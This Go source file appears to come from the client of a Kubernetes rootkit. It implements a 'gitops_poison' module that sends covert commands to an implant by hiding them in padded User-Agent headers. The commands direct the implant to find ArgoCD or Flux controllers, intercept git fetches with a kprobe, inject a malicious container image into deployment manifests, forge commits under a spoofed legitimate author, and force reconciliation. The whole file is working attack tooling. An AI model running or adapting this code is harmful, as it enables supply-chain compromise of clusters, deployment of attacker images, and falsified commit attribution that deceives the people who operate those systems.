package gitops_poison

import (
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"strings"

	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/model"
)

type PoisonResult struct {
	Actions []ActionInfo `json:"actions"`
	Success bool         `json:"success"`
}

type ActionInfo struct {
	Name   string `json:"name"`
	Status string `json:"status"`
	Detail string `json:"detail"`
}

func Execute(target, repo, targetPath, injectImage, output string) error {
	result := &PoisonResult{}

	actions := []struct {
		name   string
		detail string
		cmd    string
	}{
		{"discover_sync", "identify GitOps controller (ArgoCD/Flux) and tracked repositories", "gitops_discover"},
		{"clone_intercept", "intercept git clone/fetch operations via kprobe on connect() to repo", "gitops_intercept"},
		{"modify_manifest", "inject malicious container image into target deployment manifest", "gitops_modify"},
		{"forge_commit", "create commit with spoofed author matching legitimate committer", "gitops_commit"},
		{"trigger_sync", "force reconciliation loop to pick up modified manifests", "gitops_sync"},
	}

	for _, a := range actions {
		cmd := a.cmd + "#" + repo + "#" + targetPath + "#" + injectImage
		status := sendCommand(target, cmd)
		result.Actions = append(result.Actions, ActionInfo{
			Name:   a.name,
			Status: status,
			Detail: a.detail,
		})
	}

	result.Success = allSucceeded(result.Actions)

	data, _ := json.MarshalIndent(result, "", "  ")
	if output != "" {
		return os.WriteFile(output, data, 0644)
	}
	fmt.Println(string(data))
	return nil
}

func sendCommand(target, command string) string {
	ua := buildUserAgent(command)

	req, err := http.NewRequest("GET", target+"/gitops_poison", nil)
	if err != nil {
		return "error: " + err.Error()
	}
	req.Header.Set("User-Agent", ua)

	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return "error: " + err.Error()
	}
	defer resp.Body.Close()

	if resp.StatusCode == http.StatusOK {
		return "enabled"
	}
	return fmt.Sprintf("failed (HTTP %d)", resp.StatusCode)
}

func buildUserAgent(command string) string {
	userAgent := command
	for len(userAgent) < model.UserAgentPaddingLen {
		userAgent += "#"
	}
	return userAgent
}

func allSucceeded(actions []ActionInfo) bool {
	for _, a := range actions {
		if !strings.HasPrefix(a.Status, "enabled") {
			return false
		}
	}
	return true
}
